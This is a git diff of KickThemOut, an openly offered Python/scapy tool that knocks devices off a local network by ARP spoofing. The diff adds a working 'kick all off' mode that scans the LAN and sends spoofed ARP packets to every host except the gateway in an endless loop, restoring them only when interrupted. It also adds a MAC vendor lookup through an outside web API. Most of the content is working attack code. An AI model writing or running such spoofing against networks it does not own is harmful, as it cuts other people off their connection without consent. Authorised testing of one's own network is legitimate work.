@@ -11,10 +11,14 @@ See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
 import time, os, sys, logging, math
 import scan, spoof
 from time import sleep
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up scapy!
+import urllib2 as urllib
+
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
 from scapy.all import *
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
 
 def heading():
     sys.stdout.write(GREEN + """
@@ -24,10 +28,13 @@ def heading():
     █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
      █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
      ▀               ▀               ▀             ▀           ▀▀▀
-    """  + END + BLUE +
-    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOut{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(88) +
-    '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}) & {0}David Schütz ({1}xdavidhu{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(67) +
-    '\n' + 'Version: {0}0.1{1}'.format(YELLOW, END).center(77))
+    """ + END + BLUE +
+                     '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOut{2}){3}'.format(YELLOW, RED, YELLOW,
+                                                                                         BLUE).center(88) +
+                     '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}) & {0}David Schütz ({1}xdavidhu{2}){3}'.format(
+        YELLOW, RED, YELLOW, BLUE).center(67) +
+                     '\n' + 'Version: {0}0.1{1}\n'.format(YELLOW, END).center(77))
+
 
 def optionBanner():
     print('\nChoose option from menu:\n')
@@ -39,21 +46,49 @@ def optionBanner():
     sleep(0.2)
     print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)
 
+
 def scanNetwork():
     global hostsList
     hostsList = scan.scanNetwork()
+    regenOnlineIPs()
+
+def regenOnlineIPs():
+    global onlineIPs
+    global defaultGatewayMac
+
+    onlineIPs = []
+    for host in hostsList:
+        onlineIPs.append(host[0])
+        if host[0] == defaultGatewayIP:
+            defaultGatewayMac = host[1]
+
 
 def kickoneoff():
     os.system("clear||cls")
 
     print("\n{0}kickONEOff{1} selected...{2}\n").format(RED, GREEN, END)
     scanNetwork()
-    print "Online IPs: "
+
+    print("Online IPs: ")
 
     for i in range(len(onlineIPs)):
-	print("  [{0}"+str(i)+"{1}] {2}"+str(onlineIPs[i])+"{3}\n").format(YELLOW, WHITE, RED, END)
+        mac = ""
+        for host in hostsList:
+            if host[0] == onlineIPs[i]:
+                mac = host[1]
+        vendor = resolveMac(mac)
+        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "\n{4}").format(YELLOW, WHITE, RED, GREEN, END)
 
-    choice = int(raw_input("IP of the target: ")) # TODO: try, except
+    canBreak = False
+    while not canBreak:
+        try:
+            choice = int(raw_input("\nChoose a target: "))
+            canBreak = True
+        except KeyboardInterrupt:
+            return
+        except:
+            print("{0}[!] Please enter a number!{1}").format(RED, END)
+
     one_target_ip = onlineIPs[choice]
     one_target_mac = ""
     for host in hostsList:
@@ -78,11 +113,51 @@ def kickoneoff():
             time.sleep(0.5)
         print("\n{0}Re-arped{1} target.{2}").format(RED, GREEN, END)
 
+
 def kicksomeoff():
     print('kicksomeoff')
 
+
 def kickalloff():
-    print('kickalloff')
+    os.system("clear||cls")
+
+    print("\n{0}kickALLOff{1} selected...{2}\n").format(RED, GREEN, END)
+    scanNetwork()
+
+    print("Online IPs: ")
+    for i in range(len(onlineIPs)):
+        mac = ""
+        for host in hostsList:
+            if host[0] == onlineIPs[i]:
+                mac = host[1]
+        vendor = resolveMac(mac)
+        print(str("{0}"+ str(onlineIPs[i]) + "{1}\t" + vendor + "{2}").format(RED, GREEN, END))
+
+    print("\n{0}Spoofing started... {1}\n").format(GREEN, END)
+    try:
+        reScan = 0
+        while True:
+            for host in hostsList:
+                if host[0] != defaultGatewayIP:
+                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
+            reScan = reScan + 1
+            if reScan == 4:
+                reScan = 0
+                scanNetwork()
+            time.sleep(15)
+    except KeyboardInterrupt:
+        print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
+        rearp = 1
+        while rearp != 10:
+            for host in hostsList:
+                if host[0] != defaultGatewayIP:
+                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
+            rearp = rearp + 1
+            time.sleep(0.5)
+        print("\n{0}Re-arped{1} target.{2}").format(RED, GREEN, END)
+
+
+
 
 def getDefaultInterface():
     def long2net(arg):
@@ -116,16 +191,31 @@ def getDefaultInterface():
         if net:
             return interface
 
+
 def getGatewayIP():
     getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
     return getGateway_p.src
 
-def main():
+def resolveMac(mac):
+    try:
+        url = "http://macvendors.co/api/vendorname/"
+        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
+        response = urllib.urlopen(request)
+        vendor = response.read()
+        vendor = vendor.decode("utf-8")
+        vendor = vendor[:25]
+        return vendor
+    except:
+        return "RESOLVING_ERROR"
 
+def main():
     heading()
 
-    print("\n{0}Using interface '{1}"+defaultInterface+"{2}' with mac address '{3}"+defaultInterfaceMac+"{4}'.\nGateway IP: '{5}"
-          + defaultGatewayIP + "{6}'. {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
+    print(
+        "\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
+        + defaultGatewayIP + "{6}'. {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED,
+                                                                                                GREEN, RED, GREEN, RED,
+                                                                                                GREEN, END)
 
     try:
 
@@ -151,12 +241,13 @@ def main():
                 # EXECUTE kickalloff FUNCTION (FF:FF:FF:FF:FF:FF)
             elif choice.upper() == 'CLEAR':
                 os.system("clear||cls")
-            #else:
-                #print('*INVALID OPTION*')
+                # else:
+                # print('*INVALID OPTION*')
 
     except KeyboardInterrupt:
         print('\nThanks for dropping by.'
               '\nCatch ya later!{0}').format(END)
+
 
 if __name__ == '__main__':
 
@@ -164,10 +255,6 @@ if __name__ == '__main__':
     defaultGatewayIP = getGatewayIP()
     defaultInterfaceMac = get_if_hwaddr(defaultInterface)
     scanNetwork()
-    onlineIPs = []
-    for host in hostsList:
-        onlineIPs.append(host[0])
-        if host[0] == defaultGatewayIP:
-            defaultGatewayMac = host[1]
+
 
     main()
